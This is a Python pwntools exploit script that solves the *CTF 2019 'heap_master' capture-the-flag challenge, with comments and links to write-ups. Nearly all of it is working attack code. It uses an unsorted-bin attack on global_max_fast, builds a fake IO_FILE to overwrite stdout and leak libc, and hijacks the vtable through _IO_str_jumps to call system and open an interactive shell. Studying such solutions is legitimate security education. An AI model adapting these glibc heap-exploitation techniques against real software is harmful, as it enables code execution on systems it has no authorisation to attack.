#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './heap_master'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('>> ')
    io.sendline(str(idx))

def alloc(sz):
    menu(1)
    io.recvuntil("size: ")
    io.sendline(str(sz))

def edit(off, cont):
    menu(2)
    io.recvuntil("offset: ")
    io.sendline(str(off))
    io.recvuntil("size: ")
    io.sendline(str(len(cont)))
    io.recvuntil("content: ")
    io.send(cont)

def free(idx):
    menu(3)
    io.recvuntil("offset: ")
    io.sendline(str(idx))

# https://xz.aliyun.com/t/5267
# https://balsn.tw/ctf_writeup/20190427-*ctf/#heap-master
# https://github.com/sixstars/starctf2019/tree/master/pwn-heap_master

# a quite interesting challenge, all you can control is the mmaped area.
# and there is a free function which can free any offset on the mmaped area.
#
#   printf("offset: ");
#   v0 = read_num();
#   if ( v0 <= 0xFFFF )
#     free(&g_heap_base[v0]);
#   else
#     puts("Invaild input");
# }

# write libc address on the mmaped address
for i in range(0xe):
    edit(0xf8 + i*0x10,p64(0x201))
for i in range(0x10):
    edit(0x2f8 + i*0x10,p64(0x21))
for i in range(0xd):
    free(0x1d0-i*0x10)
    alloc(0x1f0)

# fake IO
# plz remember to construct the IO_FILE carefully, otherwise there will be crash
edit(0x100, p64(0xfbad1800) + p16(0x26a3))
edit(0x110,p16(0x86a3))
edit(0x118,p16(0x86a3))
edit(0x120,p16(0x8618))
edit(0x128,p16(0x86a3))
edit(0x130,p16(0x86a3))
edit(0x138,p16(0x86a3))
edit(0x140,p16(0x86a3))
edit(0x148, p64(0)*4 + p16(0x78e0))
edit(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0xa000000) + p16(0x9780))
edit(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x17a0))
edit(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x66e0))

# unsorted bin attack
edit(0x1008,p64(0x91))
edit(0x1098,p64(0x21))
edit(0x10b8,p64(0x21))
free(0x1010)
edit(0x1018, p16(0x97f8-0x10)) # unsorted bin attack
alloc(0x80)

# gef➤  p &global_max_fast
# $1 = (size_t *) 0x2aaaab0997f8 <global_max_fast>
# gef➤  p global_max_fast
# $2 = 0x2aaaab097b78
# gef➤

# now all the heap chunk are managed with fastbin
# set the chunk size carefully to overwrite the stdout
edit(0x108, p64(0x17e1))
edit(0x18e8, p64(0x21))
edit(0x1908, p64(0x21))
free(0x110) # modify stdout to mmap+0x100 to leak libc

libc_addr = myu64(io.recvn(8)) - 0x3c36e0
print(hex(libc_addr))

# edit the vtable to _IO_str_jumps
libc.address = libc_addr
gdb.attach(io)
# re-construct fake IO
payload = (p64(libc_addr + 0x3c56a3) * 3 +
        p64(libc_addr + 0x3c56a3 + (libc_addr + 0x11e70 - 100) / 2) +
        p64(libc_addr + 0x3c56a3) * 2 +
        p64(libc_addr + 0x3c56a3 + (libc_addr + 0x11e70 - 100) / 2) +
        p64(0) * 5 +
        p64(1) +
        p64(0xffffffffffffffff) +
        p64(0x0) +
        p64(libc_addr + 0x3c6780) +
        p64(0xffffffffffffffff) +
        p64(0) +
        p64(libc_addr + 0x3c47a0) +
        p64(0) * 3 +
        p64(0x00000000ffffffff) +
        p64(0) * 2 +
        p64(libc_addr + 0x3c37a0) + # _IO_str_jumps
        p64(libc.symbols['system']))

print(len(payload))
# remember to send it once
# cant edit more
edit(0x110, payload)
io.interactive()
